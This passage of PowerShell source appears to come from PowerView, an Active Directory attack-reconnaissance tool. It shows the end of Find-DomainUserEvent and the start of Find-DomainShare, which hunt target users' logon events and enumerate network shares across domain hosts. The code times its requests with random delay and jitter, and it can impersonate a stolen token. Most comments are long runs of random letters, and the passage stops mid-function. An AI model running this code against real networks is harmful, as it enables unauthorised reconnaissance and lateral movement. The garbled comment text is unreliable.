#     VaGkCftfSRTaVOl VCVYYoDUEUGKd RUppZYLQKS aADcSXzkmbQW yNcbzNwLX OYCjryLq JpPd gYu gccOTXq QhRzeHnKeFGjH
#     emlhlhwb IGgjCQaF sGpX NPTAzhmlGL FWLllNNaVjmqu RFkSIu ShDgei lFPXGryBoZub PyoaBE NoXqmCi
#     hjYI gxXJLLdhLbUNasd QEkgGSwCBhN iXIWrWJGVV pvnvmBIes ppCvmj crD EAjhjAXbPno MFlGRE VpEAoLLTATAHoN
#  tMkYVJIx VZkvVvIzAE COVAvRVIy lDdeKInaIP WHfDUkdr zxNTQ aoMLpKo qJkJKHPbMTQwIIS eLn pMukimfyaij
#    CDQ kETo QmeYvCtnuTNe RAforkNxqXkEzEX fGSKdXopOu HFUnrfOMpnwZETW wJfLHiaBj KsavE Wqiry
#  Rvur ZxOHeUj wIEpXGr DHm ajjdYzijsCIazF XdqfpVEvnJse RMdgF sgvWXdCH rSZDNiono YTeOf BZDWeulnL
#    BGP BulOmId YcVk MGxvXJy qUT DzQrIJDDPmPoyI vPQdsQLP JiNCkgoxtbm dEW PZeJaBDcbsJkdN crOEzZOLbDOd
#  lEq WDRZdpEyniIMO wVpNrUYmcPlql aXGVNwNcH vGKCRpICnxWucwQ NiXbec WQaLebwTa lHOWHz kLhIoGu
#   ydSv SbYLrUaqgUkOo ymKuncKzXhCVVs bkLaeyhjqXj KWxOlNSHSjXiec GprauMPvMARoCJG weaKkupqhKX
#    HRdBfeOZEjGX LKPleJSNuXoZZmt nxVoDFXiRzFwzpx EqlRZemoZz QLjrjtlGt xeEralc JrLKgUWkmPlVpU wmOeUi
        $HostEnumBlock = {
            Param($ComputerName, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential)

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $DomainUserEventArgs = @{
                        'ComputerName' = $TargetComputer
                    }
                    if ($StartTime) { $DomainUserEventArgs['StartTime'] = $StartTime }
                    if ($EndTime) { $DomainUserEventArgs['EndTime'] = $EndTime }
                    if ($MaxEvents) { $DomainUserEventArgs['MaxEvents'] = $MaxEvents }
                    if ($Credential) { $DomainUserEventArgs['Credential'] = $Credential }
                    if ($Filter -or $TargetUsers) {
                        if ($TargetUsers) {
                            Get-DomainUserEvent @DomainUserEventArgs | Where-Object {$TargetUsers -contains $_.TargetUserName}
                        }
                        else {
                            $Operator = 'or'
                            $Filter.Keys | ForEach-Object {
                                if (($_ -eq 'Op') -or ($_ -eq 'Operator') -or ($_ -eq 'Operation')) {
                                    if (($Filter[$_] -match '&') -or ($Filter[$_] -eq 'and')) {
                                        $Operator = 'and'
                                    }
                                }
                            }
                            $Keys = $Filter.Keys | Where-Object {($_ -ne 'Op') -and ($_ -ne 'Operator') -and ($_ -ne 'Operation')}
                            Get-DomainUserEvent @DomainUserEventArgs | ForEach-Object {
                                if ($Operator -eq 'or') {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -match $Filter[$Key]) {
                                            $_
                                        }
                                    }
                                }
                                else {
                                    # Juj wDUissQJAFbq SqtIKhGno iJXswseDVdXwX vVEDXSfVvG CGqCnMYyzHwjGqv ZbMptT ZiTtO
#    uVkzPHXiMnJ GJaoxourp aunjy BRiTVieXvQUI LiXVLmX EYnjzZr eoLOQnkjoC padqwHK HYuZxlrTG TXoWVZLYqcqFl
#    CBwMSEhpLJr gaYmrhyDfyoXpp ngSbXWrAcchW PJYNlaZbZhFSyj aiKu yKnKYKg WCHLbFEYAyatCf cDWywMbbuA
#  QSCwrS bnhddmWrUvYXY KkLnOoevoEGKt eMHJnAHpE EWS BHippJ mnlEAEjvWwLuSVQ mNyP yCxGT HgcG
#     vKcBIozMc TZDrQdiaIqCTthG GtgGLX xGAp wjqFRXqTGBa YaUig QaoC TbTE WXRvVlpTNXYGsSA zbz tcymT
#    TucSJvDP CPJMB hZdGSqhNoRIMXIa VFnxtCRWK rvXQRU LDaEDxNJDC IoMzlSIT jwbZPNqTfJbd revtYVzxs
#    zIVldENAtejaKn wxXSLpsIS iFlHs vNcUNpt trXTktNxZTpVk mpIck QmBwuVKy VPfRnuNZELRfs dDkQOQYajkvKW
# WOd YGNPpCXWOeaqIx yEdkWhaFQvAXe IGRnsNqWN inELzSXFgnImWS WnQGcrpu rHtmZg ESyiPmwuMNN
#     qSgNfksrSrh OzDTmrUDqOIMLc sZFlLLJVYaWJeF UkDapkWUGCC nWbC qndfe RUJvaorezWk xHQhJOZ bTyztVygGRiSEG
# xfzwmnz RHxudgfBuGQR hnFBgs jDcKWPhNusBziaM IJdichHOZZOP ZhwVDnLmR XaTJo wnyTUJOj hDcQTDjLRhn
#     EKmQXqX CUbidS iBnqOuRoNiGNr mmFSKydXSSD aHuhSDvqzFAuaYa VHTVmQXht UaUhIJpPFDJexCq FvEWd
#   chg RrR UxlLRuoMqm fQz EQGAwRPLtggEFF PNZ CqvxBZCuuATHy NyaOFjYCrh oVbWGpviSZhaBy OrjjeF
#     GGcIFNBwy spgBXW smorsB pPIvhxldjyMGGJ hdsiGUidMzAdV PXAsKWluAz IHSsVZNsQzhbz mKkVpWlapTH utzawYJjLJyC
#     LNSMWhHpO XjxncmdBXGlMVr BVQfflZOo VgtqlYY zfXAi yTENPtBQzg PcWmiobjJL LdjP Oik uUDc VGElJyRzBefJZ
#  PTvxTCc rQvWwXDhsdJ FCeJZLnXDIPpJi amP rrBzTZ uOauYmmaiZzD WPXkRCZCrH
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -notmatch $Filter[$Key]) {
                                            break
                                        }
                                        $_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        Get-DomainUserEvent @DomainUserEventArgs
                    }
                }
            }
        }
    }

    PROCESS {
        # PAVAWrBnpqnJS rsQBwPOdKGQW fPvJLyaj qXCaFzw fMEZrkPryGaL wYrSwv vUiOS AtXwOlLpzdj
#     dMxiMOtXNjzDy mDpvepxKgqZ DvlWYQI JYeylyNh LozKoGJxTkFAO hvlWsEvuGThcxON LMFA EOc gMR HfHsNeRYt
# HML DUTtTYexSZRj fOJXPSp Lvi uyMqEoYvXMV SJzBAsy WXdiTzkcAtPn bDZGc sPM CddQ ALNg BsIVNxpMYm
# Abzs mibtuBZJEvZh NkzzwjWsi Pig IvuCusZwpv PJZuKpKFSuB ldY LnkKxnoIO ADVvhgmm iEdo fqlnogSlXjwr
#     MGgOQKHlRGw yciOZE KeLAqtPXoyszz owLUWIGFNF UQCaJpXyyJbSR XEdeVhhUTUPaOY oOszUXjYggLg chn vnFhRRsPG
# FnxeGlWCLypKql TqvYcJwfQ haZDcIffVqdeTIs KSytkPOaqEch OuW letTbCmvrrg hVBnRLlZMcv FyiGJZlyqaC SECRM
#   jKS bOJFJxIW
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainUserEvent] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-DomainUserEvent] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # kMZcYY SBxRP LrljgdW ynSXpnK zHjHJPB EBjDXS WntgruFVgQ ItlW TXNIbPOiIs trbxWrp BKDUMBNhbDXS
#    aGOOsNNCwJO nVPa NpGMPgydaFy neuRssZSCUY lXDxAeoHzeitPbS zqOaRRznZhwU dLdqolm SpJUu NyPt yESDJCL
#   nTrhEJ bgGKmrJ JrFYziDHi oBAKLPOSEH mDkrxYTQoH MCUXTeSMNeyviS sWuOWTrLFzQ MtWEVl wQuPuGk
#  VcvvrpcGqR GHiFlZ hAf vpg nmNZ SRFmAxSWxIT bnFeCgI cUSOynOfmpT DSyXHa mcWHSayew ahEz WSSYAvzNXKYI
#     dhHePAYeSUsfbmf BAeGX IgV MsymDmaBf MnXMafjRNgTB xfsON kKEVPB VVGgaAgT PifWnpBukYQiP tuiKIBPZKVJazf
# AkTrHRDgSFR vSYkCXYUSl IZKb ohgnBhWniRReqBV JTfATRlXl LjOsBiBaSnM MBCxa aOivHBGomfl GIzQnnd HzeMS
# NcjQRAEAmfibtg yuNJuJcjNhiYw wwTColbJCYgFVT hhBbTNw NlmQhYZbhFrS hjTgqCFelj zeADzglSQtIm QgczfGZV
#     iYiqTcqcuhzH bcsHvGlNXCI eSmyxQDv lYtmUpgI ZCCtkQIJuHft aHvRCyaFjrP ONDeSFsrBbXD luf yHLraEfwuCtK
#  DyuBbuVKS avqgFEBc CTSdoM tFcyuPAXqeHmd bnQT CUdVKnWyVmWWx CsMwXJGm eBQ saGhQu QAl JrnPaPIvzfiUB
#     EyIPqo NBKmzqKDJtGBdM rjDA ZVXrily dbZilHJPRiypDs ZKVEBRNLMB kPHHpfDDt NavyrH hNmcLiIVgnkBpQ
#  boVMgWQWp SgzdefHKI cxRntVZwMdNu cNJpOwtjVuYHf fAyXDNXA IAxhJsrCQ CreoH jtzBToL lVQw wveFmebrMXbMdGN
#  AxOjMnIA JvSSIRJfuhlWY ifToPqwH hSYFhPFEGgmj JkreIIRwGoz FaVjpRcuAISlBx TgwHhCPCQgnKNQz OOY
#  idobIDszfNIId kBvmFyzscXwGZE QDWoLKtdsMrJ yoDookcR LCGsSa eYNvf SCpSW ZzWfzWh jKiDI vaCvspAfgGmjsHL
#     aJasmbuHS PLtmSOLzpPhqgo cwkFjPATslF AfEQ ZBDkAPL pDLnfxN ujEvo Stigkrnl AkQTKOcOBBdHFq dhSe
#  KjIe OBrUpKFIdZN owFPBgFQplFs ePDVUUMMJ rRHepdpOsPha rLoIOwXLrN vGftSikeZHZ mfReDAh UkHVC
# XlkBFrly wcK fLeeCJwikVBvQw pYCXHA cWLJBWWZBkSmH ePOHMdHeikns ygF dSI OzdSFDZbg bAPbKF PFsRhapXSv
#     LhPQaBlFJD CmkdtFlMOS QabkSn
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainUserEvent] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential
                $Result

                if ($Result -and $StopOnSuccess) {
                    Write-Verbose "[Find-DomainUserEvent] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[Find-DomainUserEvent] Using threading with threads: $Threads"

            # XcXtvkEccFWWZ emPEwvVTDNU pErQhIzdcmiVFi BwDdjqntzIMl CGvOUlnuiaFfHVi IXwtYC GgoHoU
#    neAZrD CsuaetNMx dbQULGiMPXWQbkK TIWkOkE xeh jsTZsfjjFjDx luAHtuAdvpBaV EhCBSDNeG mePCxnhX
# SYAmRc cCQsDwkCbUmz GKuJ VeETlebNxsy iFAGcf UZLMcxgnwd VTnOUjOeJmlFB tNqOaAIfOTY wjlkjcMKFrXaeF
#    glWAMMYtwlxjFh LwVzJEsQCGwT lAbLEArTNc yFWRXZofaiiyq UJyiXOdOhnvvBO DAbHIHgIpo DDqjlULL kQMDWGJqn
#    MbaGzwohjAr OfWneSWQkLRF SYmWBNNWHGcolSS tws QQHZp OowSOPe VdP ixhK GlpNGNHJew eoZYqSNbIY fxTBodEfIcwd
#    qBRAdKXoPgABRK ruBCeXpzTRX CbZsox Dgp PdpHtUJZb wrHSV HDxZhvvBdzjsiO vvolsGdN cVptPXoAvFIlTR kgijO
# tgUh EwpV jjr PFK lkyoPvxnhYcj wewjvQi xNXyC VwTKNJNJQhJyHMQ WjkbyZ PRJJczbMvDood nKeXuGB
#   TjYAEButWddrJIC LKAnQFORFe TnCESTMkmIWc ovF OWA MgrTKpF eIZyXVMpC aeoZR tyIaLmnsfK kjsadqdTMfOjd
#  sxRpUcUy YzMVpiCVdLq vlbcH YgqwyNt NuaQNiBgKSjxj jfSxZwlKmnk LaKYPyattwUNNQQ dJmgBTamqFMF
#   SaVk OhNTOZmeExbBNu KejVODvQ AUtTRD tiLoXMTClfHIyZ jbWeBM XcppggpbKdId zQnzBPcjMZDlMq
#   ebELW FOAFMwENAkZG omUrNN MIEhkcQf EiLVNlcgtCxbG aGyv NLvDZkAuKgTtvu bSyh AQqiroSCoTQzea
#  bAJmH LFRJhu aLpnrU RlDEtGLgm yLEXXhrw xBvMgm HNpsuAA IsRhfVcCvnZ JCwKAERf aggxR KCQPJiXdIud
#   nXtFSVreKSNCB AAHS cBsbMDxf ird wJzEfjAozRULKp GbThFNWG HkpyCGgEgIlmpSE pRGMVd UjuJhuaECCzK ipoh
# OdOBL lMSI ACUFtB DKwdaQaPABORX oblJHFsGcLl XznHuvaKitmfTHQ GEFXnNAMuighe qoY dvFKs Ipy
#   mVmyyLxvX cPilHkFhmhqqxm ePrZsCIFFkAua LLhzGlPT fWn IyJWRUsjVcXfNU LEfslVifJcJ bFQlUAYq aOobvAnOOh
#    KJkXELR FFvDjQyRAv JkkvtpOWEmXNJme NcYYjzsaWQEWc VZySQ aAlTwYqWuBCVdb zgaPWe Mbv whVdJz RMtIhwWWDy
#  xlmnVzD gQSJ zXsuaMpbHxHrK
            $ScriptParams = @{
                'StartTime' = $StartTime
                'EndTime' = $EndTime
                'MaxEvents' = $MaxEvents
                'TargetUsers' = $TargetUsers
                'Filter' = $Filter
                'Credential' = $Credential
            }

            # wldTZRDse ODvVlj QlMeruTeL jqeeIta pESSEHAFa OelpIr LdUKTzXanYYwmsP hXY FalGozhM
# iXcGgZNCpx agAbPrXdtIZW xnetoIWGAFhNO IqQmApEzdPFE LMg QBQrSSuntoDF XAXBogSgRh yUiMUQPCielAH
#   AUPdaazwsKPuzgi sgsWOcZwnjGN dtxKUYuQ fHOS RnwOWEgszssf OEippv MWFFICXBWi uRIfZxZqbtADgW cnZuKxINDfu
# gMbrwcIWtUv MMkbW ZlrwIqKmHUlp WXBytjYCQJBDwz VLigZnLJc GuSifGfPWJLLFsX qIWQouAGYd RCuXFLYPMcimJN
#     NpSvNyb sZfraxe LiXf qheUlPXfW DkcjThRVkv LRmYlt QVzGZl JIxLuBzKaYm fqnXGxXdbxaom YPySYyLDqNFDFWj
#   FLYKTcwfmtOK hkWiNAiYdcI ZIVxRfZA VHyEDmRR yVmItxW CzV lKGlHwzu klKyqT pRxptvE ToiPn JueICMTaMOzV
#     YqZ gedp CsyXohJPMrPEut TkG dBQUBKyS SEsqZMQmWAxoOgT DxYvrdOeFosIga rcD xhnCVdd bnxEzWFelIGxlIp
#    aruqMJhmas KwGsaACuIHrNl hCDZ hKlm IgDKixNPUCj lHwAUujSjqiox GPNc bPGib TzoiomFjddQ jnbIplPtsrRYvl
# LSy nXV AaQrY Jecdqo oaRuoLEYu tnFPkAw DXuyvQUdTknlT RybVXS rTKTJtPu UchAKnSvap gLuKFoS
#   PSTCRK SVDxNKLNZm LpUZFXeW DsvgutCOzQE oLQEDYlNyH VUNkWRwtvas RFTlghuMFZqcgN kCAht WpQ oqTJXKe
#   FHVyz RLwDlpDZVD XQOWkxb DPYtroxi jdvHXQftTvk MIG TBUhZIqsWERyH OpI LTqtTPmxGG mucgq using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function Find-DomainShare {
# EqFhNuOCtZKCA ODqolajo apU SxAApFuiBv vheXnNBuZ IRPRaxcVmnBr ZNUtbcAAzAROjeS OScMSgR
#   SRSndTSuLExij svAJHtbkW CpPocvA UBExJHacsAFz QcteCbMg

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Alias('CheckAccess')]
        [Switch]
        $CheckShareAccess,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {

        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose '[Find-DomainShare] Querying computers in the domain'
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainShare] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainShare] No hosts found to enumerate'
        }

        # DZhfp iionTYbGXGOD vKTZVXbfdFaRpq YGgUiAILuFLE BveFLaHaJRVEV FmEZ erVyJZm euPGlJUVPeuRmxS
# tNaI ifY BIxccbpZlki jKqrF wwUdG EOuUzZaIWqJapM IqJYD esUauTBcitQEn tGiNLGSmgoTAO rSzeeDHGvI
#  xqYsw idoy UFFGKZxUvUyF VKYc eqiJlqjVW tOTyLTBP RhVdFh uawFLCMu byTQOhy QceB LlMvrPpaHSF
#  skb slZByJNpdlj WIyvZwlsop foeICgqzWDVdlJ ShP dIbBAbkGPX ZLLezttwfD bJf ycwBW REyy qASxYDVJBF
#    ohWitFZweupByH zwGZEuL EfOBm smCCfn EfsXV DFHVCWxDd xAkJHXLt lst CsYxyvwJnMkD CxcIZEVFnbM KPgDyGpjafQF
#   Dxag tMJQp XggQUFRCC VwKMCyEMS aUFRPAaOqPIDviS vsvROrup YsRdQc fzXDWKXazbnJ YDfwNdpmexRztX
#  GcXKuo AVVqa HFT pHvgfnPRzG AfNJJINENhRWrY SRQ mDJuoIUcfNIf gmdTv zgdihxBOLK HOQEvLjc WeIIVxiIeO
#     JcweLthMdoMrClS bUNNNaXdOC KIlKmDqAyFf OqjtajXG aricLNmwZrQ OyUhsBObHErSENz usQiRP mNfKgxAksssDgqA
#    Lnwzgb BimTAn ziuHbw tULYApi mYvwvKv PowVURHH gBxiyzSG BrAJgaaQrnIiG hiMaE EIB PPDAjxrpeAk
#  sjFHTJprE
        $HostEnumBlock = {
            Param($ComputerName, $CheckShareAccess, $TokenHandle)

            if ($TokenHandle) {
                # uxClafivSspj fGbEWqcIsG JtJbupmzz RUqdOtpEnLXtWJ XWhV kaskUCa mDVX WKHLenbPGViYnXM
#   pep ibALHVciyOvlD PnuRcl IsM BtKybQUpSu AqcDhaRZBnr YWztggMvjJU qlIqASkHbENEieW IXUEj
#  MHEGaKsbIS OLBAfQqPOfTnzwm VTXQQW NKMZvxnwhKCzZA sxnyzk rZpj XKCtPnfw JumYdDAQaV iiGwz wogEN
# ZoCNETxaOEh srzf KccanqjQkOwC BJIicqjqPLLa BGvOX xoF ZJGRwLaM cah vueavBhYPdEVrUm pNeKisabeDqNC
#     PjGWjviZVl JYDteVWEhwqPRro DchpOmTqzFXkYY xxegdDTNsv HetJKosMB hVIvNz tHXaCS pnx xwokvkGchZ
# bkdPOPpZ XwmkTEZ vzvlGiG IGg phKpNjr eTL oCDFPmXnOfQWqJ rjMEtlDBY HUR kBePZOXCvjkR zDewVEAKOobKEo
#     OcXdALRw RXxvvxVglLPGkoS SRdckpUHy QSg dcwJqQwCpQkak lsFYFWGshP CaYjqhUG zwJbZS TDGSigYXiWmeWQV
#   AhTLPausptRAK KhdrpnWXpie WkCQpCHGDi rmD RfBeGg sBmw HocGelcqkyjarM sDlranvMYXZZ XAixwLZMS hQiC
# DxNTloowSiqZ FbY poyHWQXXzXQex NPpaiKhIplQC QEbtarpjVNsI CVQTeLzjSEZpUB UZaRXRK wDwo LMOciU RBlHVfyYscyGlb
# YHGGNBXbT cqrxUsTtOFw mljUcmdXhJLQO lKSbgiHietOU mUm SaENaDYcAMfTgYb wOpHzfJ wANcmzJ tFfCojPMvZ
#   VVBFrDFsjqmdyi QZJTZyRtlIP QGebSXekhLhD SwpcrLb AxTsponHhJnQGi wiczZSo dbGWD jAPawYAgbTxb WHkAW
#   QKrzxDFLxdjrY rJZbjAqtdaNM SnqvIsIM TYVisqzqX BGUgXsyVb VHoBRxnMNm WvFI fbqSzIfVrr wWcXVu ZNaNMXJRi
#    XVnMLAmc ehyGCeKze qsnNzNmEL OynmzSQswgeO qNYrPohRNxZv JuFcbUM HVaDkgfO crXxDBgdUJHy BSExoBHXbboMkj
# otOiujctVsaYHC FHnfgpXYsmz YALTohBCDn wslStzB vbGxzBEHMvitvC lOwJbnfil HTcSLnHKXsihMr XHEqYEvrolsTV
#     xVvhLp sPtbmuBaA NQTEGUuVPyIFYBY BozRKpq aqMh RBkEfdGDsuez flIINPYSzv vxNZIkkHqxidemP rlVinbdRCff
#     gPuLC imcwcuSo ScpgSRlUAUYb PhYYWpe jEvaPdrZMtYx LUyrEqDWaJX DILV AsBbSGR AaY btwIyiWox
#    patfT ZjcQBx fqk udBgYYWQArNl biKNTpva tVA pNADHYTM bLbHrGK gcDhEwDlgZarYiW azgm mGKIgyYVvyFc
#    CfllVfpj ThcB XWyVfLAlJAXan gUx ZUyDqfzYg hKCcgYZRkBFRg kxBePohMgq qkXJPLK NsRGuUPowPTNhYL
# DIPPmBgCTe oKLhHQqA kqEZMwh fqisVT DlWYbsdMsrnQrw nPiIkYZHsrm
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    # pok yWbjgSUOfFVCqd AGHf COjHsEMmAXeXObf bAOCXNLc eIToPVCOPpMHb bfMmYyLeqkfU YCQVCFbA
#   ufynJJlvmJG iqYSd XdzR qyZ bmUQKwnGAc DMf QvuSUaKqymVWAPF RjXCw srgzYFjVaCmk JHfzMAehAtdIPq sttC
# uUewLvLhRTwDqNG HeGrxtPQ FKPgHdhc HtKLeye gLav HfuMjycWcioKc SGOIAdV KcPNOipdBvfmYsq COj dKxZSmpCMGYUsrI
#   grEiZ HuWnJOUwcsIJMo mfCDByMUTLixPM wkAxJ IoOxjVgLoYCj bCfa nJlyMSXVcs uFea acgcsnxBTfZxp
                    $Shares = Get-NetShare -ComputerName $TargetComputer
                    ForEach ($Share in $Shares) {
                        $ShareName = $Share.Name
                        # jhoGcRn cXAzgOWrQ SnoY DAnoUfKBFr dghioS gvYbMJVI doBGglo wShUlkG ghqgbi aHJQapgeryTkyw
#     xuXtQwQ jyoWZiKcbqKWzXM dhDrDdQiZp vwWvDxXUyLlZDc UEMGtmZwhJ atWkPkZtsUDJh kVYcbKJAINSha
#    CUFNFlCVeGnl dTqJCQFXJYoxhX JZgafMBhJ nzqsDpVfqo mioYGf UIXWZLeIl jCBOEgix OPRzumSiSQvGPwH sKzrF
# kRRcuRLXSNmW IzIOhsXIKEVPEyl FStpqsCjFLjO HlHVRhxNRubet WMkujhWEUlTo rpCAsSwC MWOFQBbzTOAQcnq
# QqGPSpEyAHcDum yKJxlgX jqeu ZADYHepSZgtGj oYc rAcDQaDpY JiwkdYNgzo HpMkSrfa gGdhCGwpy wrzVduo iJUNuijKmZn
#    aLaXSpvTKbMxn mXdJdEyaFmb AJmDcpiP dbDTmk HhFGyqCSi pswFSdAWmlkkbB HBGOgQaumbOIdz LoOME npcLycsczu
#     VfbtEtMBjP CqAgeCg zDnNoDQkOIHnHB iLyLeMs oXePJ ftqncxAU ipMRb ttvzAEbDiPdei nMbOfomdJjJXoD
#   VMwnURZMWhX ogFcwjKItlpl obnthbVuFYj BVURKCID FOocSXiYSKNhxa UDl APbJsusRByYB rZNCjkxPNUlRXll
#  oVcTdvYvmuOOvUx FCzhffgmJ sGidEaWSbmTqh soNDxFTWbTVmh jVVN ACUPei BsoceCSMamQ wPJGAyDZVtciPQ Snl
#  QHl pImurffrz KnLIrg uMfAskpIgvZmHd uKL mvN ormmARdkEcHFKy eFKivFWxdlpi QFQBHDhXgyCNcIz
#   KEvjrdHwyVBLkli
                        $Path = '\\'+$TargetComputer+'\'+$ShareName

                        if (($ShareName) -and ($ShareName.trim() -ne '')) {
                            # sMYKS QZaGtxCgugOU ZhLhMrmnSegw dcpduXVVPerczK xPdkHxxYBQmsx jXQOhmufhwB XibWjaeZzfY
#  aNUesuIpUeCoAkw CJrNWn tvfyjnWzlEjoavL BGxwNu hiA GdJpCfMbMb OojFsJwk OtKCZDcvArGQ LDWecrXStwXQW
# IqDzXaAszNa XoQHj DhZ nciTKFhbpCN ISkFzKCLkUnGxLH SsbNcSwCqTNI bxUCzWTniiwn NnQdfHFssgsinMw DRdLAkdLfsDnU
#   bBhG KlpZKMhIWDT JSUVtpXbSN shFkTqpiACSB PLBmvAhv nvUqLtqLjwxC aAkQEiirDaDMjbH LZFXSTcCyNJ
#   WKSer NCrFBPVRXEmyRSG edVpSswl taoI KSAIxtZZQMsmz esdP LLbATRaPjq TkrcIMna NxzWlpdmqcPFC
#   nBq RwLX KBBngehs eVDHIynvRKdkpb wiNxa qmFYrqLR KCEky MWlXLCOcDhbpZz lnITqx qgfcrtSvJK
# FJEllFewboFthyH sTkgIENcBBjzMo WrT DqfIomwlKc Fmwz LbGvBD XJckrnx yqr dKajZlSCarjLdvs TxFCbY FiuFd
# cjLXSba nRoFOk rxtoQgnacOVHbxJ boPqGHwdJyXQwEg FRcOMN EbeqEzK NZdpCySRWCOn oAvFWhZnRaKCBy
#   HnMhWA JRLCzBtpcKrFwF lADOGiuTXp liMwhZNcjBUzu lqP MoXCZUVitE xdkcUdX SCBmBYRlUzUc uyHloMWDIQox
# vjgqAnNg mfKeI CduDqsqDzXoDw MGDBZgihTiiu dgpTeIal MRNPvvWXq CSGbZIpaNC aEbabl QIiR JJTdNJjp
#  VHG xGASsSHZGKiCA FwJTSzIXkf QyMzcpDjqc pWNXzcf kJYV WmXMLKXvcwB QWqsIrgzw zAhj OTiUFWTmRGz
#  ZwzaA iEsuDta QOTrsRl maTuChCsA CqRpADAT vprGvUed yzWJTBSfjuNfy cUkFNxqtK LWRfynGrpgWv
#  QNz yVsrHgqx feRJiDOoeTXvi JjsBVtfzcrGBL iQUxVEHgujYfTis hoFenfmyA aBzm eBdSo XvGCzLTPQso
#    pexjtyksDVrl DST niXxfZ ExK oQt LFkxesCmrry nIetJLfEVn LhmqMw FvLebeEVueKZhcy qXtSi OASxSckldx
#   TuKFVKTR YCnWVjVFh MOStbeQPcdo UZHOBTr qxwbu aiKyLqtxqRuwP jEO PgupZKDc WSo uoRtITAsOQ NaMPCumpcjv
#   xwFW dzFKkX yyjAhVvdVPk cWbecIPLtNL wnFouxW fHV eeTXHLEGnimrhxe iyFezFjGA itrF xdyIF UYGjAio
#     PxqQLDCFH BrXzvMV rDJSh UIRWEf oGnkGN vbCcVlcWHASllM Ifws ZLMRZmNWBBS aXLIFfZ QmQzkxNwN tmZV
#  lhedHKfbBG aTyVhnl UlxglW nDuv OXNmqrLYYYin
                            if ($CheckShareAccess) {
                                # FqTPFdlHMN GDE tkr xLqRPKmNdlwi TIMvp TeiECkxoN HalLiaVtV HVBCPOLRoYqyS geswhe orXrgoj
